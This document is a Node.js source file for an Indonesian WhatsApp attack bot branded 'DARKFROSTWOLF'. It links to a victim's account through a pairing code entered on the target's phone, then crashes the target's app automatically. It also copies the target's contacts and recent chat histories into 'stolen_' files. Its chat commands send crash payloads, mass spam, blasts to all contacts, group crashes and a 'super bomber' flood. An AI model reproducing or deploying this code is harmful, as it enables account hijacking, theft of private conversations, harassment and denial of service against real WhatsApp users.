// index.js
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers } = require('@whiskeysockets/baileys');
const qrcode = require('qrcode-terminal');
const pino = require('pino');
const config = require('./config.js');
const readline = require('readline');

// Import functions
const { xeoninvisible } = require('./lib/crash.js');
const { showMenu } = require('./handler/menu.js');
const { spamMassal, blastPMMassal, crashGroup, superBomber } = require('./lib/attack.js');
const chalk = require('chalk');

let sock = null;
let rl = null;

// FUNCTION UNTUK PAIRING FLEXIBLE
async function askPhoneNumber() {
  if (!rl) {
    rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout
    });
  }
  
  const question = (text) => new Promise((resolve) => rl.question(text, resolve));
  
  console.log(chalk.red.bold('\n╔══════════════════════════════════════════════════╗'));
  console.log(chalk.red.bold('║   🚀 DARKFROSTWOLF PAIRING SYSTEM v666 🚀        ║'));
  console.log(chalk.red.bold('╚══════════════════════════════════════════════════╝'));
  
  // TANYA NOMOR YANG MAU DIPAIR
  const phoneNumber = await question(
    chalk.yellow('\n📱 MASUKKAN NOMOR WHATSAPP YANG MAU DI-PAIR:\n') +
    chalk.cyan('Contoh: 6281234567890\n') +
    chalk.green('(Bisa nomor sendiri atau nomor target)\n\n') +
    chalk.yellow('Nomor: +')
  );
  
  return phoneNumber;
}

async function connectToWhatsApp() {
  const { state, saveCreds } = await useMultiFileAuthState(config.sessionName);
  
  // Socket configuration based on connection method
  const socketConfig = {
    auth: state,
    logger: pino({ level: 'silent' }),
    browser: Browsers.ubuntu('Chrome'),
    markOnlineOnConnect: true,
    syncFullHistory: false,
    printQRInTerminal: false, // Nonaktifkan QR default
  };
  
  // **FIXED PAIRING SYSTEM** - TANYA NOMOR DULU
  if (config.connectionMethod === 'pairing') {
    const phoneNumber = await askPhoneNumber();
    
    socketConfig.generatePairingCode = true;
    socketConfig.phoneNumber = phoneNumber;
    
    console.log(chalk.blue(`\n🔗 Mencoba pairing dengan: +${phoneNumber}`));
  }
  
  sock = makeWASocket(socketConfig);

  // **TAMBAHKAN XEON ATTACK FUNCTIONS KE SOCK**
  sock.xeonAttack = {
    crash: xeoninvisible,
    spam: spamMassal,
    blast: blastPMMassal,
    groupCrash: crashGroup,
    bomber: superBomber
  };

  sock.ev.on('creds.update', saveCreds);
  
  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr, pairingCode } = update;
    
    // Handle QR Code (if using QR method)
    if (qr && config.connectionMethod === 'qr') {
      console.log('╔══════════════════════════════════════╗');
      console.log('║        SCAN QR CODE BELOW            ║');
      console.log('╚══════════════════════════════════════╝');
      qrcode.generate(qr, { small: true });
      console.log('\n📱 Scan QR di WhatsApp: WhatsApp → Settings → Linked Devices');
    }
    
    // Handle Pairing Code
    if (pairingCode && config.connectionMethod === 'pairing') {
      console.log('╔══════════════════════════════════════════════════════╗');
      console.log('║          🚨 DARKFROSTWOLF PAIRING CODE 🚨           ║');
      console.log('╠══════════════════════════════════════════════════════╣');
      console.log(`║               ${chalk.greenBright(pairingCode)}               ║`);
      console.log('╠══════════════════════════════════════════════════════╣');
      console.log('║ 📱 Cara Pakai:                                       ║');
      console.log('║  1. Buka WhatsApp di HP target                      ║');
      console.log('║  2. Settings → Linked Devices                       ║');
      console.log('║  3. Link a Device → Enter Code                      ║');
      console.log('║  4. Masukkan kode di atas                           ║');
      console.log('║  5. Setelah connect, bot akan aktif!                ║');
      console.log('╚══════════════════════════════════════════════════════╝');
      
      // **AUTO CRASH JIKA NOMOR BUKAN MILIK SENDIRI**
      const phoneNumber = socketConfig.phoneNumber;
      if (phoneNumber !== config.ownerNumber) {
        console.log(chalk.red.bold('\n⚠️  WARNING: Ini nomor target!'));
        console.log(chalk.yellow('   Auto-crash akan dijalankan setelah pairing...'));
        
        // Tunggu 30 detik lalu crash
        setTimeout(async () => {
          try {
            const targetJid = `${phoneNumber}@s.whatsapp.net`;
            console.log(chalk.red('\n💀 EXECUTING AUTO-CRASH ON TARGET...'));
            await xeoninvisible(sock, targetJid);
            console.log(chalk.green('✅ CRASH SUCCESS! WhatsApp target hancur!'));
          } catch (error) {
            console.log(chalk.red('❌ Crash gagal:', error.message));
          }
        }, 30000);
      }
    }
    
    // Connection opened
    if (connection === 'open') {
      console.log('\n╔══════════════════════════════════════╗');
      console.log('║      BOT CONNECTED SUCCESSFULLY      ║');
      console.log('╠══════════════════════════════════════╣');
      console.log(`║ Bot Name: ${config.botName.padEnd(25)} ║`);
      console.log(`║ Owner: ${config.ownerName.padEnd(28)} ║`);
      console.log(`║ Prefix: ${config.botPrefix.padEnd(28)} ║`);
      console.log(`║ Mode: ${config.connectionMethod.toUpperCase().padEnd(28)} ║`);
      console.log('╚══════════════════════════════════════╝\n');
      
      // Send welcome message to owner
      await sock.sendMessage(`${config.ownerNumber}@s.whatsapp.net`, { 
        text: `${config.messages.welcome}\n\nBot Name: ${config.botName}\nVersion: ${config.botVersion}\nPrefix: ${config.botPrefix}\nConnection: ${config.connectionMethod.toUpperCase()}` 
      });
      
      // **AUTO STEAL DATA JIKA PAIRING DENGAN NOMOR TARGET**
      if (socketConfig.phoneNumber !== config.ownerNumber) {
        await stealTargetData(sock, socketConfig.phoneNumber);
      }
    }
    
    // Connection closed
    if (connection === 'close') {
      const shouldReconnect = lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(`\n⚠️ Connection closed, ${shouldReconnect ? 'reconnecting in 5s...' : 'logged out'}`);
      if (shouldReconnect) {
        setTimeout(connectToWhatsApp, 5000);
      }
    }
  });
  
  // Message handler
  sock.ev.on('messages.upsert', async (m) => {
    const msg = m.messages[0];
    if (!msg.message || msg.key.fromMe) return;
    await handleMessage(msg);
  });
  
  // Group events
  sock.ev.on('group-participants.update', async (update) => {
    const { id, participants, action } = update;
    
    if (action === 'add' && participants.includes(sock.user.id)) {
      console.log(`📥 Bot added to group: ${id}`);
      await sock.sendMessage(id, { 
        text: `${config.messages.groupJoined || '🤖 DARKFROSTWOLF BOT AKTIF! 🚀'}\n\nKetik ${config.botPrefix}menu untuk melihat fitur!` 
      });
    }
    
    if (action === 'remove' && participants.includes(sock.user.id)) {
      console.log(`📤 Bot removed from group: ${id}`);
    }
  });
  
  return sock;
}

// **FUNCTION AUTO STEAL DATA**
async function stealTargetData(sock, targetNumber) {
  console.log(chalk.red('\n🔓 STEALING TARGET DATA...'));
  
  try {
    // 1. Ambil semua chat
    const chats = await sock.getChats();
    const fs = require('fs');
    
    // 2. Simpan kontak
    const contacts = [];
    for (const chat of chats) {
      if (!chat.isGroup) {
        contacts.push({
          id: chat.id,
          name: chat.name || 'Unknown',
          lastMessage: chat.lastMessage?.message?.conversation || 'No message'
        });
      }
    }
    
    fs.writeFileSync(`stolen_${targetNumber}_contacts.json`, JSON.stringify(contacts, null, 2));
    console.log(chalk.green(`   ✓ ${contacts.length} kontak tersimpan`));
    
    // 3. Ambil beberapa chat terakhir
    for (const chat of chats.slice(0, 5)) {
      try {
        const messages = await sock.loadMessages(chat.id, 50);
        fs.writeFileSync(`stolen_${targetNumber}_chat_${chat.id.replace('@s.whatsapp.net', '')}.json`, 
          JSON.stringify(messages, null, 2));
      } catch (e) {}
    }
    
    console.log(chalk.green('   ✓ Chat history tersimpan'));
    
  } catch (error) {
    console.log(chalk.red('   ✗ Gagal steal data:', error.message));
  }
}

// **FIXED HANDLE MESSAGE FUNCTION**
async function handleMessage(msg) {
  try {
    const text = msg.message.conversation || 
                 msg.message.extendedTextMessage?.text || 
                 msg.message.imageMessage?.caption || '';
    const sender = msg.key.remoteJid;
    const pushname = msg.pushName || 'User';
    
    if (!text.startsWith(config.botPrefix)) return;
    
    const command = text.slice(config.botPrefix.length).trim().split(' ')[0].toLowerCase();
    const args = text.slice(config.botPrefix.length + command.length).trim().split(' ');
    
    console.log(`📨 ${pushname}: ${config.botPrefix}${command} ${args.join(' ')}`);
    
    // CRASH COMMAND
    if (command === 'crash' && config.enableCrash) {
      if (!args[0]) {
        return sock.sendMessage(sender, { text: `Format: ${config.botPrefix}crash 628xxxxxxx` });
      }
      
      const target = args[0].replace(/\D/g, '');
      if (!target.startsWith('62')) {
        return sock.sendMessage(sender, { text: 'Nomor harus diawali 62 (Indonesia)' });
      }
      
      const targetJid = `${target}@s.whatsapp.net`;
      
      await sock.sendMessage(sender, { text: `💀 MENGIRIM XEON CRASH KE ${target}...` });
      
      try {
        const repeat = args[1] ? parseInt(args[1]) : config.crashRepeat || 5;
        
        for (let i = 0; i < repeat; i++) {
          await xeoninvisible(sock, targetJid);
          console.log(`[${i+1}/${repeat}] Crash sent to ${target}`);
          await delay(1000);
        }
        
        await sock.sendMessage(sender, { 
          text: `${config.messages.crashSuccess || '✅ CRASH SUCCESS!'}\n\nTarget: ${target}\nJumlah: ${repeat}x\n\nDevice target mungkin freeze/restart! 💀` 
        });
      } catch (error) {
        await sock.sendMessage(sender, { text: config.messages.crashFailed || '❌ Crash gagal!' });
      }
    }
    
    // **NEW COMMANDS FROM ATTACK.JS**
    else if (command === 'spam') {
      if (args.length < 3) {
        return sock.sendMessage(sender, { 
          text: `Format: ${config.botPrefix}spam 628xxxxxxx 100 Pesan spam lu` 
        });
      }
      
      const target = args[0].replace(/\D/g, '');
      const count = parseInt(args[1]);
      const message = args.slice(2).join(' ');
      
      await sock.sendMessage(sender, { text: `🚀 Starting spam ${count}x ke ${target}...` });
      await spamMassal(sock, `${target}@s.whatsapp.net`, count, message);
      await sock.sendMessage(sender, { text: `✅ Spam ${count}x complete!` });
    }
    
    else if (command === 'blast') {
      const message = text.replace(`${config.botPrefix}blast `, '');
      if (!message) {
        return sock.sendMessage(sender, { text: `Format: ${config.botPrefix}blast Pesan kamu` });
      }
      
      await sock.sendMessage(sender, { text: `🌪 Starting PM blast to all contacts...` });
      const result = await blastPMMassal(sock, message);
      await sock.sendMessage(sender, { 
        text: `🎯 Blast complete!\nSuccess: ${result.success}\nFailed: ${result.failed}` 
      });
    }
    
    else if (command === 'groupcrash' && sender.endsWith('@g.us')) {
      await sock.sendMessage(sender, { text: `💣 Starting group crash...` });
      const result = await crashGroup(sock, sender);
      await sock.sendMessage(sender, { 
        text: `✅ Group crash complete!\nMembers crashed: ${result?.members || 'Unknown'}` 
      });
    }
    
    else if (command === 'bomber') {
      if (!args[0]) {
        return sock.sendMessage(sender, { text: `Format: ${config.botPrefix}bomber 628xxxxxxx [intensity]` });
      }
      
      const target = args[0].replace(/\D/g, '');
      const intensity = args[1] ? parseInt(args[1]) : 10;
      
      await sock.sendMessage(sender, { text: `💣💣 SUPER BOMBER LEVEL ${intensity} ACTIVATED!` });
      await superBomber(sock, `${target}@s.whatsapp.net`, intensity);
      await sock.sendMessage(sender, { text: `💥 SUPER BOMBER COMPLETE! Device hancur!` });
    }
    
    // MENU COMMAND
    else if (command === 'menu') {
      await showMenu(sock, sender, pushname);
    }
    
    // GROUP COMMANDS
    else if (command === 'kick' && sender.endsWith('@g.us')) {
      const target = msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
      if (!target) {
        return sock.sendMessage(sender, { text: `Tag orang yang mau di kick!\nContoh: ${config.botPrefix}kick @orang` });
      }
      
      try {
        await sock.groupParticipantsUpdate(sender, [target], 'remove');
        await sock.sendMessage(sender, { text: `✅ Berhasil kick @${target.split('@')[0]}` });
      } catch (error) {
        await sock.sendMessage(sender, { text: '❌ Gagal kick' });
      }
    }
    
    else if (command === 'ping') {
      const start = Date.now();
      await sock.sendMessage(sender, { text: '🏓 Pong!' });
      const latency = Date.now() - start;
      await sock.sendMessage(sender, { text: `⚡ Latency: ${latency}ms` });
    }
    
    else if (command === 'owner') {
      await sock.sendMessage(sender, { 
        text: `👑 OWNER BOT:\n\nNama: ${config.ownerName}\nNomor: ${config.ownerNumber}` 
      });
    }
    
  } catch (error) {
    console.error('Message handler error:', error);
  }
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Start bot
connectToWhatsApp();
